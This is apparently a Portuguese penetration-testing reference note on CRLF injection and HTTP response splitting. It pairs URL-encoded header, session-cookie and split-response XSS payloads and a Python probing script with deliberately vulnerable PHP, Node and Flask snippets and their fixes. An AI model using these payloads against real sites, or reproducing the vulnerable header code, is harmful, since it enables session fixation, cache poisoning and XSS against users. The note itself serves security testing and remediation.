# CRLF Injection & HTTP Response Splitting

**Tags:** #medio #alto #crlf #header-injection #cache-poisoning
**OWASP:** A03:2021  Injection
**CVSS Base:** 5.4 (Médio isolado)  8.0 (Alto em chain com cache poisoning)

---

## 📖 O que é

Quando input do usuário é refletido em **headers HTTP** sem remoção de `\r\n` (CR LF), o atacante pode injetar headers adicionais ou dividir a resposta HTTP em duas  criando uma resposta forjada completa.

---

## 🔍 `grep_search` Táticas

```
header(
setHeader(
Response.AddHeader(
addHeader(
resp.writeHead(
redirect(
Location:
Set-Cookie:
```

**O que verificar:** input do usuário é passado para qualquer um desses sem filtro de `\r\n` e `%0d%0a`.

---

## 💣 Payloads de CRLF

### URL Encoded
```
%0d%0a   \r\n (literal)
%0a      \n  (apenas LF  funciona em alguns servidores)
%0D%0A   maiúsculas também funciona
```

### Injeção de Header Simples

```
GET /redirect?url=https://example.com%0d%0aX-Injected-Header:value HTTP/1.1
```

**Resposta injetada:**
```http
HTTP/1.1 302 Found
Location: https://example.com
X-Injected-Header: value       injetado pelo atacante!
```

### Injeção de Cookie de Sessão

```
GET /redirect?url=https://legit.com%0d%0aSet-Cookie:session=ATTACKER_SESSION HTTP/1.1
```

**Resposta:**
```http
HTTP/1.1 302 Found
Location: https://legit.com
Set-Cookie: session=ATTACKER_SESSION     cookie de sessão do atacante!
```

---

## 💣 HTTP Response Splitting (Divisão da Resposta)

**Injetar dois `\r\n\r\n`** divide a resposta em duas respostas HTTP completas:

```
GET /redirect?url=https://trusted.com%0d%0a%0d%0aHTTP/1.1+200+OK%0d%0aContent-Type:+text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>
```

**Resposta do servidor:**
```http
HTTP/1.1 302 Found
Location: https://trusted.com

HTTP/1.1 200 OK
Content-Type: text/html

<script>alert(document.cookie)</script>
```

O proxy/browser pode interpretar a segunda parte como uma segunda resposta HTTP  efetivamente um XSS via injeção de header.

---

## 💣 Cache Poisoning via CRLF

**O ataque mais perigoso:** quando um cache intermediário (CDN, proxy reverso) cacheia a "segunda resposta" injetada, ela é servida para todos os usuários subsequentes que acessam aquela URL.

```
1. Atacante envia requisição com CRLF que injeta resposta com XSS payload
2. CDN cacheia a resposta injetada
3. Todos os usuários que acessam a URL recebem o payload cacheado
4. XSS persistente para todos  sem precisar de banco de dados comprometido
```

---

## 🎯 Contextos de Injeção

### PHP  header()

```php
//  VULNERÁVEL
$url = $_GET['url'];
header("Location: " . $url);  // $url pode conter \r\n
```

### Node.js  res.setHeader()

```javascript
//  VULNERÁVEL
app.get('/redirect', (req, res) => {
    const url = req.query.url;
    res.setHeader('Location', url);    // url pode ter \r\n
    res.status(302).end();
});
```

### Python  Flask

```python
#  VULNERÁVEL  linha de log ou header manual
@app.get('/redirect')
def redirect_to():
    url = request.args.get('url')
    response = make_response('', 302)
    response.headers['Location'] = url   # url pode ter \r\n
    return response
```

---

## 🧪 Script de Validação

```python
# .tmp/validate_crlf.py
import requests

TARGET = "http://target.com"
ENDPOINT = "/redirect"
PARAM = "url"

PAYLOADS = [
    "https://legit.com\r\nX-Injected: pwned",
    "https://legit.com\nX-Injected: pwned",
    "https://legit.com%0d%0aX-Injected: pwned",
    "https://legit.com%0aX-Injected: pwned",
    "https://legit.com%0d%0aSet-Cookie: admin=true",
]

for payload in PAYLOADS:
    r = requests.get(f"{TARGET}{ENDPOINT}", params={PARAM: payload},
                     allow_redirects=False, timeout=10)
    
    headers_str = str(r.headers)
    if 'X-Injected' in headers_str or 'admin=true' in headers_str:
        print(f"[🔴 VULN] CRLF Injection confirmada!")
        print(f"  Payload: {payload!r}")
        print(f"  Headers injetados: {r.headers}")
    else:
        print(f"[ok] {payload[:50]!r}  {r.status_code}")
```

---

## 🛡️ Correção

```php
//  CORRETO  remover \r e \n antes de usar em header
$url = str_replace(["\r", "\n"], '', $_GET['url']);
header("Location: " . $url);

//  CORRETO  usar funções builtin de redirect que já sanitizam
header("Location: " . filter_var($url, FILTER_SANITIZE_URL));
```

```javascript
//  CORRETO  Node.js: Express já sanitiza em versões >= 4.x
// Mas se usando setHeader manualmente:
const url = req.query.url.replace(/[\r\n]/g, '');
res.setHeader('Location', url);

//  MELHOR  usar res.redirect() que protege automaticamente
res.redirect(302, url);
```

```python
#  CORRETO  Python Flask (redirect já sanitiza)
from flask import redirect, url_for

@app.get('/redirect')
def safe_redirect():
    url = request.args.get('url', '/')
    # Remover CRLF manualmente se usar headers customizados
    url = url.replace('\r', '').replace('\n', '')
    return redirect(url)
```

---

## 🔗 Chain Exploits

```
CRLF Injection + Cache Poisoning  XSS persistente para todos via CDN
CRLF + Set-Cookie injection  Session Fixation  Account Takeover
CRLF + Location header  Open Redirect via header injetado
CRLF + Response Splitting + JavaScript  XSS completo via header injection
CRLF + Log injection  Falsificar entradas de auditoria
```

---

## 📌 Referências
- [[xss-cross-site-scripting]]
- [[open-redirect]]
- [[http-security-headers]]
- [OWASP CRLF Injection](https://owasp.org/www-community/attacks/CRLF_Injection)
- [HackTricks CRLF](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)
